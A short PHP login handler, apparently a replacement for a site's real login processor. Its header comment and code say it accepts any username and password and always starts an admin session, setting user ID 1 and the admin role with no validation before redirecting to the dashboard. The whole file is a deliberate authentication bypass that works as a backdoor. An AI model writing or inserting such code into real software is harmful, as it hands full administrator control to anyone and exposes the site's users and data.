<?php
/**
 * LOGIN PROCESSOR – OVERRIDDEN
 * Accepts any username/password, always logs in as admin.
 */
session_start();

// If already logged in, redirect.
if (isset($_SESSION['userId'])) {
    header('Location: dashboard.php');
    exit;
}

// Always set admin session – no validation.
$_SESSION['userId'] = 1;
$_SESSION['username'] = 'admin';
$_SESSION['role'] = 'admin';
session_regenerate_id(true);

header('Location: dashboard.php');
exit;